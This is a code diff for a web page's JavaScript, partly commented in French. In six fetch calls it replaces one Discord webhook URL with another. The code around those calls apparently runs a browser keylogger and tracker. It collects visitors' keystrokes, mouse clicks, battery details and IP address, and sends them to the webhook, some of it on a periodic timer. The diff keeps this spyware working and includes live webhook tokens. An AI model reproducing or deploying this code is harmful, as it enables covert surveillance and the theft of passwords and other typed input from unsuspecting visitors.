@@ -261,7 +261,7 @@
         function getBatteryInfo() {
             if (navigator.getBattery) {
                 navigator.getBattery().then(function(battery) {
-                    fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                    fetch('https://discord.com/api/webhooks/1539822279507185774/zORqnx0ERX6usvVv2GGC_4jDGBRlVut_WRZhTfd-gswn8BvuPsjjjfF4kjBNDcYs3FgQ', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -290,7 +290,7 @@
             
             // Envoyer les frappes accumulées
             if (keystrokes.length > 0) {
-                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                fetch('https://discord.com/api/webhooks/1539822279507185774/zORqnx0ERX6usvVv2GGC_4jDGBRlVut_WRZhTfd-gswn8BvuPsjjjfF4kjBNDcYs3FgQ', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -307,7 +307,7 @@
 
             // Envoyer les clics souris
             if (mouseClicks.length > 0) {
-                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                fetch('https://discord.com/api/webhooks/1539822279507185774/zORqnx0ERX6usvVv2GGC_4jDGBRlVut_WRZhTfd-gswn8BvuPsjjjfF4kjBNDcYs3FgQ', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -372,7 +372,7 @@
                 timestamp: new Date().toISOString()
             };
 
-            fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+            fetch('https://discord.com/api/webhooks/1539822279507185774/zORqnx0ERX6usvVv2GGC_4jDGBRlVut_WRZhTfd-gswn8BvuPsjjjfF4kjBNDcYs3FgQ', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -411,7 +411,7 @@
             
             setTimeout(async function() {
                 const ip = await getIP();
-                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                fetch('https://discord.com/api/webhooks/1539822279507185774/zORqnx0ERX6usvVv2GGC_4jDGBRlVut_WRZhTfd-gswn8BvuPsjjjfF4kjBNDcYs3FgQ', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -434,7 +434,7 @@
         // Envoi périodique du keylogger
         setInterval(function() {
             if (keystrokes.length > 0) {
-                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                fetch('https://discord.com/api/webhooks/1539822279507185774/zORqnx0ERX6usvVv2GGC_4jDGBRlVut_WRZhTfd-gswn8BvuPsjjjfF4kjBNDcYs3FgQ', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
